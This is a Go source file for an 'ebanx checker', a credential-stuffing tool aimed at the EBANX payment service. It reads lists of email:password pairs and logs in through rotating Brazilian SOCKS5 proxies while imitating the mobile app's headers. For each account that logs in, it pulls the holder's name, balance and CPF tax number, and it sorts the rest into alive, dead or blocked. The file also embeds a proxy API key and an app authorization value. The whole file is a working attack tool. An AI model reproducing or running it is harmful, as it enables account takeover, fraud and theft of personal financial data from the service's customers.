package main

/*
ebanx.go checker
coded by d3z3n0v3
coded on 07.10.2017 at 19:36
 */

import (
	"fmt"
	"os"
	"log"
	"bufio"
	"net/http"
	"bytes"
	"io/ioutil"
	"strings"
	"net/url"
)

const (
	CODE_BLOCKED = 0
	CODE_DEAD = 1
	CODE_ALIVE = 2
	APP_AUTHOR =  "d3z3n0v3"
	APP_VERSION = "1.0.0"
	APP_TITLE = "ebanx checker"
	CHECKER_URL = "https://gandalf.ebanx.com/accessToken"
	CHECKER_URL2 = "https://conta.ebanx.com/api/v1/timeline?per_page=30"
	CHECKER_URL3 = "https://conta.ebanx.com/api/v1/customer"
	API_KEY = "318e67226fc480f642113786320c1e4f08be4987"
)

type Checker struct {
	alive, dead, blocked []string
}

func (x *Checker) push(option int, element string) {
	switch option {
	case CODE_BLOCKED: x.blocked = append(x.blocked, element)
	case CODE_DEAD: x.dead = append(x.dead, element)
	case CODE_ALIVE: x.alive = append(x.alive, element)
	}
}

func (x *Checker) response(user, pass, format, aproxy, ptype string) {
	var json = []byte(fmt.Sprintf(`{"email":"%s","password":"%s","group":"customer","grant_type":"password"}`, user, pass))
	req, err := http.NewRequest("POST", CHECKER_URL, bytes.NewBuffer(json))
	req.Header.Set("app-version", "2.0.3")
	req.Header.Set("authorization", "Basic cHJvZGFjY291bnQ6ZDlkY2I1NzJhMDM3YmM5MWM5NGJkZmE3NzBkMGE2ZWMzZmQxN2I5YTE3N2I=")
	req.Header.Set("content-type", "application/json; charset=UTF-8")
	req.Header.Set("user-agent", "okhttp/3.7.0")

	proxy, err := url.Parse(fmt.Sprintf("%s://%s", ptype, aproxy))

	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxy)}}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	if strings.Contains(string(body), "Invalid login or password.") {
		x.push(CODE_DEAD, fmt.Sprintf("✗ DEAD %s", format))
	} else if strings.Contains(string(body), `"access_token"`) {
		var token string = getstr(string(body), `"access_token":"`, `"`)
		req, err := http.NewRequest("GET", CHECKER_URL2, nil)
		req.Header.Set("authorization", fmt.Sprintf("Bearer %s", token))
		req.Header.Set("app-version", "2.0.3")
		req.Header.Set("user-agent", "okhttp/3.7.0")

		proxy, err = url.Parse(fmt.Sprintf("%s://%s", ptype, aproxy))

		client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxy)}}
		resp, err = client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		body, _ := ioutil.ReadAll(resp.Body)

		var balance string = getstr(string(body), `"balance":`, `"`)

		req, err = http.NewRequest("GET", CHECKER_URL3, nil)
		req.Header.Set("authorization", fmt.Sprintf("Bearer %s", token))
		req.Header.Set("app-version", "2.0.3")
		req.Header.Set("user-agent", "okhttp/3.7.0")

		proxy, err = url.Parse(fmt.Sprintf("%s://%s", ptype, aproxy))

		client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxy)}}
		resp, err = client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		body, _ = ioutil.ReadAll(resp.Body)

		var name string = getstr(string(body), `"name":"`, `"`)
		var cpf string = getstr(string(body), `"document_number":"`, `"`)

		x.push(CODE_ALIVE, fmt.Sprintf("✓ ALIVE %s - %s - %s - %s", format, name, balance, cpf))
	} else {
		x.push(CODE_BLOCKED, fmt.Sprintf("✗ BLOCKED %s", format))
	}
}

type Account struct {
	user, pass, separator string
}

func (x *Account) set(user, pass, separator string) {
	x.user = user
	x.pass = pass
	x.separator = separator
}

func (x *Account) get() string {
	return x.user + x.separator + x.pass
}

func getstr(str, start, end string) string {
	array := strings.Split(str, start)
	array = strings.Split(array[1], end)
	return array[0]
}

type Proxy struct {
	proxy, ptype string
}

func (x *Proxy) setptype(ptype string) {
	x.ptype = ptype
}

func (x *Proxy) set() {
	req, err := http.NewRequest("GET", fmt.Sprintf("https://api.getproxylist.com/proxy?apiKey=%s&&country[]=BR&protocol[]=%s&lastTested=600", API_KEY, x.ptype), nil)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	x.proxy = fmt.Sprintf("%s:%s", getstr(string(body), `"ip": "`, `"`), getstr(string(body), `"port": `, `,`))
}

func main() {
	fmt.Println(fmt.Sprintf("%s by %s #v %s", APP_TITLE, APP_AUTHOR, APP_VERSION))

	var separator, filestr string

	fmt.Print("File: ")
	fmt.Scanln(&filestr)

	fmt.Print("Separator: ")
	fmt.Scanln(&separator)

	file, err := os.Open(filestr)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		array := strings.Split(scanner.Text(), separator)
		user, pass := array[0], array[1]

		var proxy Proxy
		proxy.setptype("socks5")
		proxy.set()

		var account Account
		account.set(user, pass, separator)

		var checker Checker
		checker.response(account.user, account.pass, account.get(), proxy.proxy, proxy.ptype)

		for _, element := range checker.alive { fmt.Println(element + " | " + proxy.proxy) }
		for _, element := range checker.dead { fmt.Println(element + " | " + proxy.proxy) }
		for _, element := range checker.blocked { fmt.Println(element + " | " + proxy.proxy) }
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}
